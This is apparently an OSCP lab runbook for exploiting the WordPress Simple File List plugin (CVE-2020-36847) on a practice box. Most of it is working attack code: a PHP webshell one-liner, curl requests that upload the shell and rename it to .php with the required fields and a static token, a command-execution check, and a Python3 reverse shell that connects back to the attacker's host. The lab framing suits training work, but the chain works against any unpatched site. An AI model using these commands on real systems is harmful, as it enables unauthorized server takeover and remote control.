---
tags: [oscp, wordpress, fileupload, rce, runbook]
box_sources: [Nukem]
---

# WordPress — Simple File List Upload RCE

*CVE-2020-36847: unauthenticated file upload + rename via Simple File List plugin ≤ 4.2.2. Two-step exploit: upload .png webshell, rename to .php.*

---

## Identify

```bash
# Check plugin readme for version
curl -s "http://$BoxIP/wp-content/plugins/simple-file-list/readme.txt" | head -5
# Stable tag: 4.2.2

# Confirm plugin is active (CSS/JS loaded on any WP page)
curl -s "http://$BoxIP/" | grep -i "simple-file-list"
```

Vulnerable versions: ≤ 4.2.2

---

## Technique

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| Upload shell.png to ee-upload-engine.php with plugin fields | Response: `SUCCESS` | Plugin ≤ 4.2.2, unauthenticated | Needs eeSFL_Token — static WP option, get from shortcode page or use known value | Step 2: Rename | [[Foothold - Public Exploit]] |
| Rename shell.png → shell.php via ee-file-engine.php | Response: `SUCCESS` | Same upload worked | `eeFileOld` field (not `oldFile`), plus `X-Requested-With` + `Referer` headers | Test RCE | Re-check field names |
| Access shell.php with `?cmd=id` | Returns `uid=...` | Rename succeeded, PHP executes | Shell lands at `/wp-content/uploads/simple-file-list/` | Reverse shell | Check .htaccess blocking PHP |

---

## Step 1 — Create Webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > exploits/shell.png
```

---

## Step 2 — Upload

```bash
curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
  -F "file=@exploits/shell.png;type=image/png" \
  -F "eeSFL_ID=1" \
  -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \
  -F "eeSFL_Timestamp=1587258885" \
  -F "eeSFL_Token=ba288252629a5399759b6fde1e205bc2"
```

**If you get HTTP 500**: Missing plugin fields. The endpoint needs `eeSFL_ID`, `eeSFL_FileUploadDir`, `eeSFL_Timestamp`, and `eeSFL_Token` — without them, PHP crashes trying to use undefined variables.

**Where to find the token**: The token is a WordPress option set at plugin activation. It's embedded in any page that renders the `[simple-file-list]` shortcode. Search for `eeSFL_ActionNonce` in the page HTML. If no shortcode page exists, the token from plugin defaults may work (static value above).

Verify upload landed before rename:

```bash
curl -s -o /dev/null -w "%{http_code}" "http://$BoxIP/wp-content/uploads/simple-file-list/shell.png"
# 200 = file is there; 404 = upload failed
```

---

## Step 3 — Rename to .php

```bash
curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: http://$BoxIP/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1" \
  -d "eeSFL_ID=1&eeFileOld=shell.png&eeListFolder=/&eeFileAction=Rename|shell.php"
```

Field name gotchas:
- `eeFileOld` = current filename (NOT `oldFile`, `eeFilename`, or `eeFile`)
- `eeListFolder=/` = folder (required)
- `eeFileAction=Rename|shell.php` = action pipe new name (literal `|`, not URL-encoded `%7C`)
- `X-Requested-With: XMLHttpRequest` = required header
- `Referer` = plugin checks this, use WP admin page URL above

---

## Step 4 — RCE

```bash
curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=id"
# uid=33(http) gid=33(http)   (Arch Linux web user is 'http', not 'www-data')
```

---

## Reverse Shell

**mkfifo+nc may fail via PHP system()** — try Python3 instead (check Python3 availability from other services, e.g. Flask):

```bash
curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php" \
  --get --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LocalIP\",$Port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

---

## Cleanup

```bash
rm /srv/http/wp-content/uploads/simple-file-list/shell.php
# (Arch Linux webroot at /srv/http/ — adjust for other distros: /var/www/html/)
```

---

## Module Links

[[08. Introduction to Web Application Attacks]] — file upload, extension bypass
[[13. Locating Public Exploits]] — searchsploit, CVE research

## External Resources

- [EDB-52371](https://www.exploit-db.com/exploits/52371) — exploit script (mass scanner, use as reference only)
- [HackTricks - File Upload](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/file-upload) — extension bypass techniques
- [PayloadsAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files) — bypass wordlists and patterns
